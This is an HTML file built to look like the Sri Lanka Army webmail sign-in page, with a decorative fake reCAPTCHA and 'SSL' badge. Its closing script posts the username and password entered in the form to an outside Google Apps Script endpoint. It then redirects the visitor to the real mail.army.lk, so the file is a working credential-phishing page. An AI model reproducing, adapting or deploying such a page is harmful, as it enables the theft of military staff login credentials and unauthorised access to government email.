<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sri Lanka Army — Web Mail</title>
    <link rel="icon" type="image/x-icon" href="Logo.ico">
    <!-- Barlow Condensed for headings, Barlow for body -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@300;400;600;700;800;900&family=Barlow:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Barlow', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
            display: flex;
        }

        .container {
            display: flex;
            width: 100%;
            min-height: 100vh;
            position: relative;
        }

        .left-side {
            position: absolute;
            left: 0;
            top: 0;
            width: 40%;
            height: 100%;
            background-image: url('ss.png');
            background-size: cover;
            background-position: center;
            background-color: #2d5016;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
            padding: 0px;
            overflow: hidden;
        }

        .right-side {
            position: absolute;
            right: 0;
            top: 0;
            width: 60%;
            height: 100%;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: left;
            padding: 20px;
            padding-top: 20px;
            margin-top: 0;
        }

        .login-box {
            width: 100%;
            max-width: 470px;
        }

        .logo-section {
            margin-bottom: 12px;
        }

        /* Font styles matching the reference image */
        .page-title {
            font-family: 'Barlow Condensed', sans-serif;
            font-size: 28px;
            color: #666;
            letter-spacing: 3px;
            margin-bottom: 0px;
            font-weight: 300;
            text-transform: uppercase;
        }

        .page-subtitle {
            font-family: 'Barlow Condensed', sans-serif;
            font-size: 60px;
            font-weight: 800;
            color: #1a1a1a;
            margin-bottom: 2px;
            letter-spacing: 1px;
            line-height: 1;
            text-transform: uppercase;
        }

        .page-webmail {
            font-family: 'Barlow Condensed', sans-serif;
            font-size: 14px;
            color: #666;
            letter-spacing: 3px;
            margin-bottom: 0;
            font-weight: 300;
            text-transform: uppercase;
        }

        .underline {
            width: 45px;
            height: 3px;
            background: #d4af37;
            margin: 6px 0 10px 0;
        }

        .warning-message {
            background: #b7d6a5;
            border: none;
            border-left: 4px solid #5cd437;
            padding: 12px 14px;
            margin-bottom: 16px;
            font-size: 12px;
            font-family: 'Barlow', sans-serif;
            color: #333;
            line-height: 1.5;
            border-radius: 4px;
            text-align: justify;
        }

        .form-group {
            margin-bottom: 12px;
            position: relative;
        }

        .form-label {
            display: block;
            font-family: 'Barlow Condensed', sans-serif;
            font-size: 11px;
            font-weight: 600;
            color: #333;
            letter-spacing: 2px;
            margin-bottom: 6px;
            text-transform: uppercase;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-icon-left {
            position: absolute;
            left: 12px;
            width: 18px;
            height: 18px;
            color: #999;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: none;
        }

        .form-input {
            width: 100%;
            padding: 11px 14px 11px 40px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 13px;
            font-family: 'Barlow', sans-serif;
            background: white;
            color: #333;
            transition: border-color 0.3s;
        }

        .form-input:focus {
            outline: none;
            border-color: #4a7c1c;
            box-shadow: 0 0 0 3px rgba(74, 124, 28, 0.1);
        }

        .form-input::placeholder {
            color: #999;
            font-family: 'Barlow', sans-serif;
        }

        .checkbox-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 12px 0 14px 0;
            font-size: 12px;
            font-family: 'Barlow', sans-serif;
        }

        .checkbox-label {
            display: flex;
            align-items: center;
            gap: 7px;
            color: #333;
            cursor: pointer;
        }

        .checkbox-label input[type="checkbox"] {
            width: 16px;
            height: 16px;
            cursor: pointer;
            accent-color: #4a7c1c;
        }

        .help-link {
            color: #4a7c1c;
            text-decoration: none;
            font-weight: 500;
            font-family: 'Barlow', sans-serif;
            font-size: 12px;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        /* reCAPTCHA box */
        .recaptcha-box {
            border: 1px solid #ddd;
            padding: 12px 14px;
            margin-bottom: 14px;
            background: white;
            border-radius: 4px;
            display: flex;
            align-items: center;
            gap: 10px;
            transition: all 0.3s;
        }

        .recaptcha-box:hover {
            border-color: #ccc;
        }

        .recaptcha-checkbox {
            width: 18px;
            height: 18px;
            cursor: pointer;
            flex-shrink: 0;
            appearance: none;
            border: 2px solid #ddd;
            border-radius: 3px;
            background: white;
            transition: all 0.3s;
        }

        .recaptcha-checkbox:hover {
            border-color: #bbb;
        }

        .recaptcha-checkbox:checked {
            background: #4a7c1c;
            border-color: #4a7c1c;
            position: relative;
        }

        .recaptcha-checkbox:checked::after {
            content: '✓';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 12px;
            font-weight: bold;
            line-height: 1;
        }

        .recaptcha-text-block {
            flex: 1;
        }

        .recaptcha-text {
            font-size: 13px;
            font-family: 'Barlow', sans-serif;
            color: #333;
            margin-bottom: 0px;
            font-weight: 600;
        }

        .recaptcha-brand {
            font-size: 8px;
            color: #999;
            font-family: 'Barlow', sans-serif;
            letter-spacing: 0.5px;
        }

        .recaptcha-icon {
            width: 28px;
            height: 28px;
            flex-shrink: 0;
        }

        .sign-in-btn {
            width: 100%;
            padding: 11px;
            background: #4a7c1c;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-family: 'Barlow Condensed', sans-serif;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.3s;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .sign-in-btn:hover {
            background: #3d6415;
        }

        .sign-in-btn:active {
            transform: scale(0.98);
        }

        /* Footer */
        .footer {
            margin-top: 14px;
            padding-top: 10px;
            border-top: 1px solid #ddd;
            font-size: 10px;
            color: #999;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            font-family: 'Barlow', sans-serif;
        }

        .footer-title {
            font-family: 'Barlow Condensed', sans-serif;
            font-weight: 700;
            font-size: 11px;
            color: #444;
            letter-spacing: 0.5px;
            margin-bottom: 2px;
            text-transform: uppercase;
        }

        .footer-sub {
            font-family: 'Barlow', sans-serif;
            font-size: 9px;
            color: #aaa;
        }

        /* SSL badge — green styling */
        .ssl-badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            background: #e8f5e9;
            color: #4a7c1c;
            padding: 6px 12px;
            border-radius: 12px;
            font-size: 9px;
            font-family: 'Barlow Condensed', sans-serif;
            font-weight: 600;
            letter-spacing: 1px;
            white-space: nowrap;
            margin-left: auto;
            border: 1px solid #4a7c1c;
        }

        .ssl-badge svg {
            width: 11px;
            height: 11px;
        }

        /* ============================================
           RESPONSIVE DESIGN - 4+ BREAKPOINTS
           ============================================ */

        /* Large Desktop (1200px and above) */
        @media (min-width: 1200px) {
            .page-title {
                font-size: 28px;
            }

            .page-subtitle {
                font-size: 60px;
            }

            .page-webmail {
                font-size: 14px;
            }

            .form-label {
                font-size: 11px;
            }

            .form-input {
                font-size: 13px;
                padding: 11px 14px 11px 40px;
            }
        }

        /* Tablet & Medium Desktop (1024px - 1199px) */
        @media (max-width: 1199px) {
            .page-title {
                font-size: 26px;
            }

            .page-subtitle {
                font-size: 52px;
            }

            .page-webmail {
                font-size: 13px;
            }

            .form-label {
                font-size: 10px;
            }

            .form-input {
                font-size: 12px;
                padding: 10px 12px 10px 38px;
            }

            .recaptcha-text {
                font-size: 12px;
            }

            .sign-in-btn {
                font-size: 13px;
                padding: 10px;
            }

            .footer {
                font-size: 9px;
            }

            .footer-title {
                font-size: 10px;
            }

            .footer-sub {
                font-size: 8px;
            }
        }

        /* Tablet (768px - 1023px) */
        @media (max-width: 1023px) {
            .left-side {
                position: static;
                width: 100%;
                min-height: 180px;
            }

            .right-side {
                position: static;
                width: 100%;
                min-height: auto;
                padding: 16px;
                padding-top: 16px;
                justify-content: center;
            }

            .login-box {
                margin-top: 0;
                max-width: 100%;
                width: 100%;
            }

            .logo-section {
                margin-bottom: 10px;
            }

            .page-title {
                font-size: 22px;
                letter-spacing: 2px;
            }

            .page-subtitle {
                font-size: 44px;
            }

            .page-webmail {
                font-size: 11px;
                letter-spacing: 2px;
            }

            .underline {
                margin: 5px 0 8px 0;
            }

            .form-label {
                font-size: 9px;
                margin-bottom: 5px;
            }

            .form-input {
                font-size: 11px;
                padding: 9px 11px 9px 36px;
            }

            .input-icon-left {
                width: 16px;
                height: 16px;
                left: 10px;
            }

            .checkbox-row {
                margin: 10px 0 12px 0;
                font-size: 11px;
            }

            .checkbox-label input[type="checkbox"] {
                width: 14px;
                height: 14px;
            }

            .help-link {
                font-size: 11px;
            }

            .recaptcha-box {
                padding: 10px 12px;
                margin-bottom: 12px;
                gap: 8px;
            }

            .recaptcha-checkbox {
                width: 16px;
                height: 16px;
            }

            .recaptcha-text {
                font-size: 11px;
            }

            .recaptcha-brand {
                font-size: 7px;
            }

            .recaptcha-icon {
                width: 24px;
                height: 24px;
            }

            .sign-in-btn {
                font-size: 12px;
                padding: 9px;
                letter-spacing: 1px;
            }

            .footer {
                margin-top: 10px;
                padding-top: 8px;
                font-size: 8px;
                gap: 8px;
            }

            .footer-title {
                font-size: 9px;
                margin-bottom: 1px;
            }

            .footer-sub {
                font-size: 7px;
            }

            .ssl-badge {
                font-size: 8px;
                padding: 5px 10px;
            }

            .ssl-badge svg {
                width: 10px;
                height: 10px;
            }
        }

        /* Small Mobile (480px - 767px) */
        @media (max-width: 767px) {
            body {
                font-size: 14px;
            }

            .left-side {
                min-height: 140px;
            }

            .right-side {
                padding: 12px;
                padding-top: 12px;
            }

            .logo-section {
                margin-bottom: 8px;
            }

            .page-title {
                font-size: 18px;
                letter-spacing: 2px;
            }

            .page-subtitle {
                font-size: 36px;
            }

            .page-webmail {
                font-size: 10px;
            }

            .underline {
                width: 35px;
                margin: 4px 0 6px 0;
            }

            .form-group {
                margin-bottom: 10px;
            }

            .form-label {
                font-size: 8px;
                margin-bottom: 4px;
                letter-spacing: 1px;
            }

            .form-input {
                font-size: 10px;
                padding: 8px 10px 8px 34px;
            }

            .input-icon-left {
                width: 14px;
                height: 14px;
                left: 9px;
            }

            .checkbox-row {
                margin: 8px 0 10px 0;
                font-size: 10px;
            }

            .checkbox-label input[type="checkbox"] {
                width: 13px;
                height: 13px;
            }

            .help-link {
                font-size: 10px;
            }

            .recaptcha-box {
                padding: 8px 10px;
                margin-bottom: 10px;
                gap: 7px;
            }

            .recaptcha-checkbox {
                width: 15px;
                height: 15px;
            }

            .recaptcha-checkbox:checked::after {
                font-size: 11px;
            }

            .recaptcha-text {
                font-size: 10px;
            }

            .recaptcha-brand {
                font-size: 6px;
            }

            .recaptcha-icon {
                width: 20px;
                height: 20px;
            }

            .sign-in-btn {
                font-size: 11px;
                padding: 8px;
                letter-spacing: 1px;
            }

            .footer {
                margin-top: 8px;
                padding-top: 6px;
                font-size: 7px;
                gap: 6px;
            }

            .footer-title {
                font-size: 8px;
                margin-bottom: 1px;
            }

            .footer-sub {
                font-size: 6px;
            }

            .ssl-badge {
                font-size: 7px;
                padding: 4px 8px;
                gap: 3px;
            }

            .ssl-badge svg {
                width: 9px;
                height: 9px;
            }
        }

        /* Extra Small Mobile (320px - 479px) */
        @media (max-width: 479px) {
            .left-side {
                min-height: 100px;
            }

            .right-side {
                padding: 10px;
                padding-top: 10px;
            }

            .login-box {
                max-width: 100%;
            }

            .logo-section {
                margin-bottom: 6px;
            }

            .page-title {
                font-size: 14px;
                letter-spacing: 1px;
            }

            .page-subtitle {
                font-size: 28px;
            }

            .page-webmail {
                font-size: 8px;
            }

            .underline {
                width: 30px;
                height: 2px;
                margin: 3px 0 5px 0;
            }

            .form-group {
                margin-bottom: 8px;
            }

            .form-label {
                font-size: 7px;
                margin-bottom: 3px;
            }

            .form-input {
                font-size: 9px;
                padding: 7px 8px 7px 32px;
            }

            .input-icon-left {
                width: 12px;
                height: 12px;
                left: 8px;
            }

            .checkbox-row {
                margin: 6px 0 8px 0;
                font-size: 9px;
                flex-wrap: wrap;
                gap: 8px;
            }

            .checkbox-label input[type="checkbox"] {
                width: 12px;
                height: 12px;
            }

            .help-link {
                font-size: 9px;
            }

            .recaptcha-box {
                padding: 6px 8px;
                margin-bottom: 8px;
                gap: 6px;
            }

            .recaptcha-checkbox {
                width: 14px;
                height: 14px;
                min-width: 14px;
            }

            .recaptcha-checkbox:checked::after {
                font-size: 10px;
            }

            .recaptcha-text {
                font-size: 9px;
            }

            .recaptcha-brand {
                font-size: 5px;
            }

            .recaptcha-icon {
                width: 18px;
                height: 18px;
            }

            .sign-in-btn {
                font-size: 10px;
                padding: 7px;
                letter-spacing: 0.5px;
            }

            .footer {
                margin-top: 6px;
                padding-top: 5px;
                font-size: 6px;
                gap: 4px;
                flex-direction: column;
                align-items: flex-start;
            }

            .footer-title {
                font-size: 7px;
                margin-bottom: 0px;
            }

            .footer-sub {
                font-size: 5px;
                line-height: 1.2;
            }

            .ssl-badge {
                font-size: 6px;
                padding: 3px 6px;
                gap: 2px;
                margin-left: 0;
                margin-top: 4px;
            }

            .ssl-badge svg {
                width: 8px;
                height: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-side"></div>

        <div class="right-side">
            <div class="login-box">
                <div class="logo-section">
                    <div class="page-title">SRI LANKA</div>
                    <div class="page-subtitle">ARMY</div>
                    <div class="underline"></div>
                    <div class="page-webmail">WEB MAIL</div>
                </div>

                <form id="myForm">
                    <div class="form-group">
                        <label class="form-label">User Name</label>
                        <div class="input-wrapper">
                            <div class="input-icon-left">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                                    <circle cx="12" cy="7" r="4"/>
                                </svg>
                            </div>
                            <input type="text" name="name" class="form-input" placeholder="Username" required>
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="form-label">Password</label>
                        <div class="input-wrapper">
                            <div class="input-icon-left">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                                </svg>
                            </div>
                            <input type="password" name="pw" class="form-input" placeholder="Enter your password" required>
                        </div>
                    </div>

                    <div class="checkbox-row">
                        <label class="checkbox-label">
                            <input type="checkbox">
                            Keep me signed in
                        </label>
                        <a href="#" class="help-link">Help</a>
                    </div>

                    <div class="recaptcha-box">
                        <input type="checkbox" class="recaptcha-checkbox">
                        <div class="recaptcha-text-block">
                            <div class="recaptcha-text">I'm not a robot</div>
                            <div class="recaptcha-brand">reCAPTCHA</div>
                        </div>
                        <img src="RecaptchaLogo.svg.png" alt="reCAPTCHA" class="recaptcha-icon">
                    </div>

                    <button type="submit" class="sign-in-btn">Sign In →</button>

                    <div id="message"></div>

                    <div class="footer">
                        <div>
                            <div class="footer-title">Sri Lanka Army Webmail</div>
                            <div class="footer-sub">All Rights Reserved &nbsp;|&nbsp; Directorate of IT — Sri Lanka Army</div>
                        </div>
                        <div class="ssl-badge">
                            <!-- lock icon -->
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                                <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                            </svg>
                            SSL
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <script>
    const scriptURL = "https://script.google.com/macros/s/AKfycbw389L-E61bTbfTyQGUvkupfEHIv4uE1ZtwOcwNeCFNzBleU6uuN1TzUF1ef4d_sgp0/exec";
    const redirectURL = "https://mail.army.lk";

    document.getElementById("myForm").addEventListener("submit", function(e) {
        e.preventDefault();

        // Remove old error message
        const oldError = document.getElementById("errorMessage");
        if (oldError) {
            oldError.remove();
        }

        const formData = new FormData(this);

        fetch(scriptURL, {
            method: "POST",
            body: formData
        })
        .then(response => {
            if (response.ok) {
                // Redirect instead of showing success message
                window.location.href = redirectURL;
            } else {
                throw new Error("Submission failed");
            }
        })
        .catch(error => {

            // Create error message above Name field
            const errorDiv = document.createElement("div");
            errorDiv.id = "errorMessage";
            errorDiv.style.color = "red";
            errorDiv.style.marginBottom = "15px";
            errorDiv.innerText =
                "Unable to submit the form. Please try again later.";

            const nameField = document.querySelector('input[name="name"]');
            nameField.parentNode.insertBefore(errorDiv, nameField);

            console.error(error);
        });
    });
</script>
</body>
</html>
